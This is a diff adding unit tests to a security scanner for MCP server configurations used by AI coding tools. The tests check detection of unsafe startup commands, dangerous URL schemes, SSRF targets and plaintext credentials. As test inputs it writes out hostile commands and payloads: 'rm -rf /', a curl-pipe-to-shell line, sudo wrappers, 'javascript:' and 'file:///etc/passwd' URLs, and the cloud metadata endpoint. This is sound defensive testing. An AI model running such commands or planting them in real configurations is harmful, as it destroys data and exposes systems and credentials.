@@ -141,6 +141,146 @@ describe('MCP server risk', () => {
   })
 })
 
+describe('unsafe stdio startup-command patterns', () => {
+  const mcp = (over: Record<string, unknown>) => tool('claude-code', {
+    mcpServers: [{ name: 'srv', type: 'stdio', ...over } as DetectedTool['mcpServers'][number]],
+  })
+
+  it('flags sudo in a startup command', () => {
+    const f = assessMcpRisk([mcp({ command: 'sudo', args: ['npx', '-y', 'weather-mcp@1.0.0'] })])
+    const hit = f.find(x => x.id === 'mcp-startup-sudo')
+    expect(hit?.severity).toBe('critical')
+  })
+
+  it('does NOT flag "sudo" as a mere substring of an unrelated argument', () => {
+    // argv0-based detection, not a bare regex — `--sudo-mode` must not trip
+    // the same false-positive class command-normalizer.ts's own callers
+    // guard against.
+    const f = assessMcpRisk([mcp({ command: 'npx', args: ['-y', '--sudo-mode', 'pkg@1.0.0'] })])
+    expect(f.map(x => x.id)).not.toContain('mcp-startup-sudo')
+  })
+
+  it('flags rm -rf against root/home as a destructive startup command', () => {
+    const f = assessMcpRisk([mcp({ command: 'rm', args: ['-rf', '/'] })])
+    const hit = f.find(x => x.id === 'mcp-startup-destructive-rm')
+    expect(hit?.severity).toBe('critical')
+  })
+
+  it('does NOT flag an ordinary scoped rm -rf (node_modules, dist, ...)', () => {
+    // Mirrors install.ts's shipped no-destructive-commands rule: rm -rf
+    // node_modules is common and benign, not a wipe.
+    const f = assessMcpRisk([mcp({ command: 'rm', args: ['-rf', 'node_modules'] })])
+    expect(f.map(x => x.id)).not.toContain('mcp-startup-destructive-rm')
+  })
+
+  it('flags curl | sh as a pipe-to-shell startup command', () => {
+    const f = assessMcpRisk([mcp({ command: 'sh', args: ['-c', 'curl https://x.tld/i.sh | sh'] })])
+    const hit = f.find(x => x.id === 'mcp-startup-pipe-to-shell')
+    expect(hit?.severity).toBe('critical')
+  })
+
+  it('does NOT flag a clean runner invocation', () => {
+    const f = assessMcpRisk([mcp({ command: 'npx', args: ['-y', 'weather-mcp@1.0.0'] })])
+    expect(f.map(x => x.id)).not.toEqual(expect.arrayContaining([
+      'mcp-startup-sudo', 'mcp-startup-destructive-rm', 'mcp-startup-pipe-to-shell',
+    ]))
+  })
+
+  it('still catches sudo/rm/pipe-to-shell hidden behind the documented cmd /c Windows wrapper', () => {
+    const f = assessMcpRisk([mcp({ command: 'cmd', args: ['/c', 'sudo', 'rm', '-rf', '/'] })])
+    expect(f.map(x => x.id)).toContain('mcp-startup-sudo')
+    expect(f.map(x => x.id)).toContain('mcp-startup-destructive-rm')
+  })
+})
+
+describe('dangerous MCP server URL schemes', () => {
+  const mcp = (over: Record<string, unknown>) => tool('claude-code', {
+    mcpServers: [{ name: 'srv', type: 'http', ...over } as DetectedTool['mcpServers'][number]],
+  })
+
+  it.each(['javascript:alert(1)', 'data:text/html,<script>alert(1)</script>', 'file:///etc/passwd', 'vbscript:msgbox(1)'])(
+    'flags %s as a dangerous scheme',
+    (url) => {
+      const f = assessMcpRisk([mcp({ url })])
+      const hit = f.find(x => x.id === 'mcp-dangerous-url-scheme')
+      expect(hit?.severity).toBe('critical')
+    },
+  )
+
+  it('does NOT flag an ordinary https:// URL', () => {
+    const f = assessMcpRisk([mcp({ url: 'https://example.com/mcp' })])
+    expect(f.map(x => x.id)).not.toContain('mcp-dangerous-url-scheme')
+  })
+})
+
+describe('SSRF-shaped MCP server URLs', () => {
+  const mcp = (over: Record<string, unknown>) => tool('claude-code', {
+    mcpServers: [{ name: 'srv', type: 'http', ...over } as DetectedTool['mcpServers'][number]],
+  })
+
+  it('flags a cloud metadata endpoint as critical', () => {
+    const f = assessMcpRisk([mcp({ url: 'http://169.254.169.254/latest/meta-data/' })])
+    const hit = f.find(x => x.id === 'mcp-ssrf-metadata-endpoint')
+    expect(hit?.severity).toBe('critical')
+  })
+
+  it.each(['http://10.0.0.5:8080/mcp', 'http://172.20.0.4/mcp', 'http://192.168.1.10/mcp'])(
+    'flags a private-range URL %s at a lower severity than metadata',
+    (url) => {
+      const f = assessMcpRisk([mcp({ url })])
+      const hit = f.find(x => x.id === 'mcp-ssrf-private-target')
+      expect(hit?.severity).toBe('medium')
+    },
+  )
+
+  it('does NOT flag a public https:// URL', () => {
+    const f = assessMcpRisk([mcp({ url: 'https://example.com/mcp' })])
+    expect(f.map(x => x.id)).not.toEqual(expect.arrayContaining(['mcp-ssrf-metadata-endpoint', 'mcp-ssrf-private-target']))
+  })
+})
+
+describe('plaintext credentials in MCP server config', () => {
+  const mcp = (over: Record<string, unknown>) => tool('claude-code', {
+    mcpServers: [{ name: 'srv', type: 'stdio', command: 'npx', args: ['-y', 'weather-mcp@1.0.0'], ...over } as DetectedTool['mcpServers'][number]],
+  })
+
+  // A uniform run (`'a'.repeat(n)`) IS the redaction-placeholder shape
+  // secret-confidence.ts is deliberately built to allow through — using one
+  // here would test that filter, not this check. This generates a
+  // realistic-looking, non-repeating credential body instead (the
+  // (i*37+11)%62 step is coprime with 62, so no two consecutive characters
+  // ever repeat).
+  const ALPHABET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+  const pseudoRandom = (n: number) => Array.from({ length: n }, (_, i) => ALPHABET[(i * 37 + 11) % 62]).join('')
+
+  it('flags a literal secret-shaped value in env', () => {
+    const secret = 'sk-' + pseudoRandom(48)
+    const f = assessMcpRisk([mcp({ env: { OPENAI_API_KEY: secret } })])
+    const hit = f.find(x => x.id === 'mcp-plaintext-credential')
+    expect(hit?.severity).toBe('high')
+    // Never print the raw credential — evidence must be redacted.
+    expect(hit?.evidence).not.toContain(secret)
+  })
+
+  it('flags a literal secret-shaped value in headers', () => {
+    const secret = 'ghp_' + pseudoRandom(36)
+    const f = assessMcpRisk([mcp({ type: 'http', command: undefined, url: 'https://example.com/mcp', headers: { Authorization: `Bearer ${secret}` } })])
+    const hit = f.find(x => x.id === 'mcp-plaintext-credential')
+    expect(hit?.severity).toBe('high')
+    expect(hit?.evidence).not.toContain(secret)
+  })
+
+  it('does NOT flag a ${VAR} reference', () => {
+    const f = assessMcpRisk([mcp({ env: { OPENAI_API_KEY: '${OPENAI_API_KEY}' } })])
+    expect(f.map(x => x.id)).not.toContain('mcp-plaintext-credential')
+  })
+
+  it('does NOT flag a documented placeholder credential', () => {
+    const f = assessMcpRisk([mcp({ env: { AWS_ACCESS_KEY_ID: 'AKIAIOSFODNN7EXAMPLE' } })])
+    expect(f.map(x => x.id)).not.toContain('mcp-plaintext-credential')
+  })
+})
+
 describe('combined assessment', () => {
   it('makes an unprotected agent host the headline finding', () => {
     const { home, cwd } = fixture()
